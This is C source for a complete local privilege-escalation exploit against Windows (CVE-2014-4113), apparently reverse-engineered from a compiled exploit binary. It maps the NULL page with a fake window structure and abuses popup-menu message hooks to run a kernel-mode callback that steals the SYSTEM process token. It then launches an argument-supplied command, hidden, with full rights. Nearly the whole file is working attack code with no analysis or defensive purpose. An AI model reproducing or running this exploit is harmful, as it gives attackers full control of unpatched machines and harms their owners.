//
// CVE-2014-4113 'win32 exp C code' reversed from 'exe exp'

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

/////////////////////////////////////////////////////////////

#ifndef _SYSTEM_MODULE_INFORMATION_ENTRY

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID  MappedBase;
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

#endif

////////////////////////////////////////////////////////////


typedef LPVOID PEPROCESS;
typedef int(__stdcall *PZWQUERYSYSTENINFORMATION)(DWORD, PVOID, DWORD, PDWORD);
typedef int(__stdcall *PZWALLOCATEVIRTUALMEMORY) (HANDLE, PVOID, ULONG, PDWORD,
	ULONG, ULONG);
typedef int(__stdcall *PLOOKUPPROCESSBYID)(DWORD, PEPROCESS *);
typedef	LPVOID(__stdcall *PTICURRENT)();


PZWQUERYSYSTENINFORMATION fpQuerySysInfo = NULL;
PZWALLOCATEVIRTUALMEMORY  fpAllocateVirtualMem = NULL;
PLOOKUPPROCESSBYID		  fpLookupProcessById = NULL;

DWORD dwTokenOffset = 0;
DWORD gFlag1 = 0;
DWORD gFlag2 = 0;
DWORD gFlag3 = 0;

WNDPROC lpPrevWndFunc = NULL;

DWORD dwCurProcessId = 0;
DWORD dwSystemProcessId = 0;

//////////////////////////////////////

void PrintMsg(const char *formatString, ...)
{
	va_list  va;
	va_start(va, formatString);
	vprintf(formatString, va);
	ExitProcess(0);
}


int InitTokenOffset()
{
	int result;
	OSVERSIONINFO VerInfo;

	VerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (!GetVersionExA(&VerInfo))
	{
		printf("FAIL : GetVersion\n");
		ExitProcess(0);
	}

	result = 1;
	if (VerInfo.dwMajorVersion == 5)
	{
		switch (VerInfo.dwMinorVersion)
		{
		case 0:
		{
			dwTokenOffset = 0x12C;
			break;
		}
		case 1:
		{
			dwTokenOffset = 0x0C8;
			break;
		}
		case 2:
		{
			dwTokenOffset = 0x0D8;
			break;
		}
		default:
		{
			dwTokenOffset = 0x0C8;
		}
		}
	}
	else if (VerInfo.dwMajorVersion == 6)
	{
		switch (VerInfo.dwMinorVersion)
		{
		case 0:
		{
			dwTokenOffset = 0x0E0;
			break;
		}
		case 1:
		{
			dwTokenOffset = 0x0F8;
			break;
		}
		default:
		{
			result = 0;
		}
		}
	}
	else
	{
		result = 0;
	}

	if (result == 0)
	{
		printf("FAIL : InitTokenOffset\n");
		ExitProcess(0);
	}

	return result;
}



HMODULE GetKrnlNtBase(char *szNtName)
{
	char  Buffer[0xA];
	DWORD dwRetLength;

	int SystemModuleInfo = 0x0B;
	if (0xC0000004 != fpQuerySysInfo(SystemModuleInfo, Buffer, 0x0A, &dwRetLength))
	{
		printf("FAILED \n");
		ExitProcess(0);
	}

	PSYSTEM_MODULE_INFORMATION pBuf = (PSYSTEM_MODULE_INFORMATION)LocalAlloc(LMEM_ZEROINIT,
		dwRetLength);

	if (0 != fpQuerySysInfo(SystemModuleInfo, pBuf, dwRetLength, &dwRetLength))
	{
		printf("FAILED \n");
		ExitProcess(0);
	}

	PSYSTEM_MODULE_INFORMATION_ENTRY pModEntry = pBuf->Module;
	HMODULE hModuleBase = NULL;

	for (DWORD i = 0; i < pBuf->Count; i++)
	{
		//ASCII "\SystemRoot\system32\ntkrnlpa.exe"
		if (strstr(pModEntry->ImageName, "nt") && strstr(pModEntry->ImageName, "exe"))
		{
			/// strcpy_s(szNtName, 0x104, (char*)((DWORD)pModEntry->ImageName + pModEntry->PathLength));
			strncpy(szNtName, (char*)((DWORD)pModEntry->ImageName + pModEntry->PathLength), MAX_PATH);
			hModuleBase = (HMODULE)(pModEntry->Base);
			break;
		}
		pModEntry++;
	}

	if (hModuleBase == NULL)
	{
		printf("FAIL : Get Ntoskrnl Base\n");
		ExitProcess(0);
	}

	LocalFree(pBuf);
	return hModuleBase;
}


int InitExpVars()
{
	HMODULE hNtdll;

	hNtdll = LoadLibraryA("ntdll.dll");

	if (hNtdll == NULL)
	{
		printf("FAIL : hNtdll == NULL \n");
		ExitProcess(0);
	}

	fpQuerySysInfo = (PZWQUERYSYSTENINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	fpAllocateVirtualMem = (PZWALLOCATEVIRTUALMEMORY)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");

	if (!fpQuerySysInfo || !fpAllocateVirtualMem)
	{
		printf("FAIL : GetProcAddress ZwQuerySystemInformation or ZwAllocateVirtualMemory\n");
		ExitProcess(0);
	}

	char NtKernelName[MAX_PATH];

	HMODULE hKrnlNtBase = GetKrnlNtBase(NtKernelName);
	HMODULE hUserNtBase = LoadLibraryA(NtKernelName);

	fpLookupProcessById = (PLOOKUPPROCESSBYID)((DWORD)GetProcAddress(hUserNtBase, \
		"PsLookupProcessByProcessId") - (DWORD)hUserNtBase + (DWORD)hKrnlNtBase);
	dwCurProcessId = GetCurrentProcessId();
	dwSystemProcessId = 4;

	FreeLibrary(hUserNtBase);

	return 1;
}


LPVOID CallPtiCurrent()
{
	LPVOID  result = NULL;
	HMODULE hUser32 = NULL;
	PVOID   dstFunc;

	hUser32 = LoadLibraryA("user32.dll");

	if (hUser32)
	{
		dstFunc = (PVOID)GetProcAddress(hUser32, "AnimateWindow");
		if (gFlag2) // gFlag2 always zero in win32 exp
		{
			dstFunc = (PVOID)GetProcAddress(hUser32, "CreateSystemThreads");
		}
		if (dstFunc && *(WORD *)hUser32 == 0x5A4D)
		{
			IMAGE_NT_HEADERS *pPEHead = (IMAGE_NT_HEADERS *)((DWORD)hUser32 + \
				*(DWORD*)((DWORD)hUser32 + 0x3C));

			DWORD dwImageBase = pPEHead->OptionalHeader.ImageBase;
			DWORD dwImageBound = pPEHead->OptionalHeader.SizeOfImage + dwImageBase;

			PBYTE p = (PBYTE)dstFunc;

			// search function 'PtiCurrent' address in code segment
			for (DWORD i = 0; i < 70; i++)
			{
				if ((*p == 0xE8 && gFlag2 == 0) || (*p == 0xE9 && gFlag2))
				{
					if ((DWORD)p < dwImageBase || (DWORD)p > dwImageBound) break;

					PTICURRENT fnPtiCurrent;
					fnPtiCurrent = (PTICURRENT)(*(DWORD*)(p + 1) + (DWORD)p + 5);

					result = fnPtiCurrent(); // result == pointer tagTHREADINFO 

					break;
				}
				p++;
			}
		}
		FreeLibrary(hUser32);
	}
	return result;
}


// This is our fake 'WndProc' used to exploit
LRESULT CALLBACK ShellCode(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	PEPROCESS pCur, pSys;
	fpLookupProcessById(dwCurProcessId, &pCur);
	fpLookupProcessById(dwSystemProcessId, &pSys);
	*(DWORD *)((DWORD)pCur + dwTokenOffset) = *(DWORD *)((DWORD)pSys + dwTokenOffset);
	return  0;
}


int  InitExploitMem(LPVOID *pAllocAddr)
{
	LPVOID pThreadInfo = CallPtiCurrent();

	*(DWORD*)pAllocAddr = 1;
	DWORD dwRegionSize = 0x2000;

	int iret = fpAllocateVirtualMem(GetCurrentProcess(),
		pAllocAddr, 0, &dwRegionSize,
		MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE);
	if (iret)
	{
		printf("Allocate Mem Failed \n");
		ExitProcess(0);
	}

	*(DWORD*)(0x3) = (DWORD)pThreadInfo;  // 3-(-5)    = 8   
	*(BYTE*)(0x11) = (BYTE)4;             // 17-(-5)   = 0x16, bServerSideWindowProc 
	*(DWORD*)(0x5B) = (DWORD)ShellCode;    // 0x5B-(-5) = 0x60, lpfnWndProc

	return 1;
}


LRESULT CALLBACK MyWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (uMsg == WM_ENTERIDLE) // 0x121
	{
		if (gFlag1 != 1)
		{
			gFlag1 = 1;
			PostMessageA(hWnd, WM_KEYDOWN, 0x28, 0);
			PostMessageA(hWnd, WM_KEYDOWN, 0x27, 0);
			PostMessageA(hWnd, WM_LBUTTONDOWN, 0x00, 0);
		}
	}
	return DefWindowProcA(hWnd, uMsg, wParam, lParam);
}


HMENU InitPopupMenu()
{
	MENUITEMINFO Item1, Item2;
	HMENU        hMenu1, hMenu2;

	memset(&Item1, 0, sizeof(Item1));
	memset(&Item2, 0, sizeof(Item2));

	hMenu1 = CreatePopupMenu();
	if (hMenu1 == NULL) return 0;

	Item1.cbSize = sizeof(Item1);
	Item1.fMask = MIIM_STRING; // Retrieves or sets the dwTypeData member.
	if (FALSE == InsertMenuItemA(hMenu1, 0, TRUE, &Item1))
	{
		DestroyMenu(hMenu1);
		return NULL;
	}

	hMenu2 = CreatePopupMenu();
	if (hMenu2 == NULL) return NULL;

	static char szMenuText[2] = " ";

	Item2.fMask = MIIM_STRING | MIIM_SUBMENU;
	Item2.dwTypeData = szMenuText;
	Item2.cch = 1;             // length of szMenuText
	Item2.hSubMenu = hMenu1;
	Item2.cbSize = sizeof(Item2);

	if (FALSE == InsertMenuItemA(hMenu2, 0, TRUE, &Item2))
	{
		printf("InsertMenuItem FAIL [%d] !\n", GetLastError());
		DestroyMenu(hMenu1);
		DestroyMenu(hMenu2);
		return NULL;
	}
	return hMenu2;
}


LRESULT CALLBACK NewWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (uMsg != 0x1EB)
	{
		return CallWindowProcA(lpPrevWndFunc, hWnd, uMsg, wParam, lParam);
	}
	EndMenu();
	return -5;
}


LRESULT CALLBACK WndProcHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	CWPSTRUCT *pWndProcArgs = (CWPSTRUCT*)lParam;

	if (pWndProcArgs->message == 0x1EB) // MN_FINDMENUWINDOWFROMPOINT
	{
		if (!gFlag3)
		{
			gFlag3 = 1;
			if (UnhookWindowsHook(WH_CALLWNDPROC, WndProcHook))
			{
				lpPrevWndFunc = (WNDPROC)SetWindowLongA(pWndProcArgs->hwnd,
					GWLP_WNDPROC,
					(LONG)NewWndProc);
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


DWORD WINAPI ThreadProc(LPVOID lParam)
{
	WNDCLASS    wc;
	SYSTEM_INFO SystemInfo;
	HWND        hWnd;
	int         result = 0;
	LPVOID 		pAllocAddr;

	memset(&SystemInfo, 0, 0x24);
	memset(&wc, 0, sizeof(wc));

	wc.lpfnWndProc = MyWndProc;
	wc.lpszClassName = "woqunimalegebi";

	//GetNativeSystemInfo(&SystemInfo);
	//if(SystemInfo.dwOemId == PROCESSOR_ARCHITECTURE_AMD64) return 0 ; 

	RegisterClassA(&wc);
	hWnd = CreateWindowExA(0, wc.lpszClassName, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0);
	if (hWnd == NULL) return 0;

	InitExploitMem(&pAllocAddr);

	HMENU hMenu2 = InitPopupMenu();

	if (hMenu2)
	{
		DWORD dwThreadId = GetCurrentThreadId();
		if (SetWindowsHookExA(WH_CALLWNDPROC, WndProcHook, 0, dwThreadId))
		{
			if (TrackPopupMenu(hMenu2, 0, -10000, -10000, 0, hWnd, 0))
			{
				PostMessageA(hWnd, 0, 0, 0);
				result = 1;
			}
		}
	}

	DestroyWindow(hWnd);
	if (hMenu2)
	{
		DestroyMenu(hMenu2);
	}
	UnhookWindowsHook(WH_CALLWNDPROC, WndProcHook);
	VirtualFree(pAllocAddr, 0, MEM_RELEASE);
	return result;
}


int main(int argc, char *argv[])
{
	InitTokenOffset();

	InitExpVars();

	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ThreadProc, 0, 0, 0);

	if (WaitForSingleObject(hThread, 300000))
	{
		TerminateThread(hThread, 0);
		PrintMsg("FAIL [%d]\n", GetLastError());
	}

	if (argv[1])
	{
		STARTUPINFO 	    StartupInfo;
		PROCESS_INFORMATION ProcessInfo;

		memset(&StartupInfo, 0, sizeof(StartupInfo));
		memset(&ProcessInfo, 0, sizeof(ProcessInfo));

		StartupInfo.cb = sizeof(STARTUPINFO);
		StartupInfo.wShowWindow = SW_HIDE;
		StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
		CreateProcessA(0, argv[1], 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInfo);
		WaitForSingleObject(ProcessInfo.hProcess, 60000);
		CloseHandle(ProcessInfo.hProcess);
		CloseHandle(ProcessInfo.hThread);
	}
	return 0;
}